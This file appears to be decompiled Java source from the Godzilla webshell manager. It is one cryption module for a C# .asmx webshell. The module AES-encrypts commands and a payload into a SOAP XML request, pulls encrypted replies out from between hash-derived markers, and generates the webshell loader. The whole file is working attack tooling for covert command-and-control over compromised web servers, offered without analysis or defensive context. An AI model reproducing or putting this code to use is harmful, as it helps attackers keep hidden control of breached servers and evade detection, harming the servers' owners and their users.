/*     */ package shells.cryptions.cshapAes;
/*     */ 
/*     */ import core.imp.Cryption;
/*     */ import core.shell.ShellEntity;
/*     */ import java.io.InputStream;
/*     */ import java.net.URLEncoder;
/*     */ import javax.crypto.Cipher;
/*     */ import javax.crypto.spec.IvParameterSpec;
/*     */ import javax.crypto.spec.SecretKeySpec;
/*     */ import util.Log;
/*     */ import util.functions;
/*     */ import util.http.Http;
/*     */ 
/*     */ 
/*     */ 
/*     */ 
/*     */ public class CShapAsmxAesBase64Ex
/*     */   implements Cryption
/*     */ {
/*     */   private ShellEntity shell;
/*     */   private Http http;
/*     */   private Cipher decodeCipher;
/*     */   private Cipher encodeCipher;
/*     */   private String key;
/*     */   private boolean state;
/*     */   private byte[] payload;
/*     */   private String findStrLeft;
/*     */   private String pass;
/*     */   private String findStrRight;
/*     */   private String xmlRequest;
/*     */   
/*     */   public void init(ShellEntity context) {
/*  33 */     this.shell = context;
/*  34 */     this.http = this.shell.getHttp();
/*  35 */     this.key = this.shell.getSecretKeyX();
/*  36 */     this.pass = this.shell.getPassword();
/*  37 */     String findStrMd5 = functions.md5(this.pass + this.key);
/*  38 */     this.findStrLeft = findStrMd5.substring(0, 16).toUpperCase();
/*  39 */     this.findStrRight = findStrMd5.substring(16).toUpperCase();
/*  40 */     this.shell.getHeaders().put("Content-Type", "text/xml; charset=utf-8");
/*     */     
/*  42 */     this.xmlRequest = readXmlRequest(this.pass);
/*     */     try {
/*  44 */       this.encodeCipher = Cipher.getInstance("AES/CBC/PKCS5Padding");
/*  45 */       this.decodeCipher = Cipher.getInstance("AES/CBC/PKCS5Padding");
/*  46 */       this.encodeCipher.init(1, new SecretKeySpec(this.key.getBytes(), "AES"), new IvParameterSpec(this.key.getBytes()));
/*  47 */       this.decodeCipher.init(2, new SecretKeySpec(this.key.getBytes(), "AES"), new IvParameterSpec(this.key.getBytes()));
/*  48 */       this.payload = this.shell.getPayloadModule().getPayload();
/*  49 */       if (this.payload != null) {
/*     */         
/*  51 */         this.state = true;
/*     */       } else {
/*  53 */         Log.error("payload Is Null");
/*     */       }
/*     */     
/*  56 */     } catch (Exception e) {
/*  57 */       Log.error(e);
/*     */       return;
/*     */     } 
/*     */   }
/*     */ 
/*     */   
/*     */   public byte[] encode(byte[] data) {
/*     */     try {
/*  65 */       return this.xmlRequest.replace("{payload}", URLEncoder.encode(functions.base64EncodeToString(this.encodeCipher.doFinal(this.payload))))
/*  66 */         .replace("{data}", URLEncoder.encode(functions.base64EncodeToString(this.encodeCipher.doFinal(data)))).getBytes();
/*  67 */     } catch (Exception e) {
/*  68 */       Log.error(e);
/*  69 */       return null;
/*     */     } 
/*     */   }
/*     */ 
/*     */ 
/*     */   
/*     */   public byte[] decode(byte[] data) {
/*     */     try {
/*  77 */       data = functions.base64Decode(findStr(data));
/*  78 */       return this.decodeCipher.doFinal(data);
/*  79 */     } catch (Exception e) {
/*  80 */       Log.error(e);
/*  81 */       return null;
/*     */     } 
/*     */   }
/*     */   
/*     */   public String findStr(byte[] respResult) {
/*  86 */     String htmlString = new String(respResult);
/*  87 */     return functions.subMiddleStr(htmlString, this.findStrLeft, this.findStrRight);
/*     */   }
/*     */ 
/*     */ 
/*     */ 
/*     */   
/*     */   public boolean isSendRLData() {
/*  94 */     return false;
/*     */   }
/*     */ 
/*     */ 
/*     */ 
/*     */ 
/*     */   
/*     */   public boolean check() {
/* 102 */     return this.state;
/*     */   }
/*     */ 
/*     */ 
/*     */   
/*     */   public byte[] generate(String password, String secretKey) {
/* 108 */     return Generate.GenerateShellLoderByAsmx("csharpShellEx", password, functions.md5(secretKey).substring(0, 16));
/*     */   }
/*     */   
/*     */   private static String readXmlRequest(String pass) {
/* 112 */     byte[] data = new byte[0];
/*     */     try {
/* 114 */       InputStream inputStream = CShapAsmxAesBase64Ex.class.getResourceAsStream("template/asmxRequestEx.bin");
/* 115 */       data = functions.readInputStream(inputStream);
/* 116 */     } catch (Exception e) {
/* 117 */       Log.error(e);
/*     */     } 
/* 119 */     return (new String(data)).replace("{pass}", pass);
/*     */   }
/*     */ }


/* Location:              C:\User\\user\Downloads\godzilla.jar!\shells\cryptions\cshapAes\CShapAsmxAesBase64Ex.class
 * Java compiler version: 8 (52.0)
 * JD-Core Version:       1.1.3
 */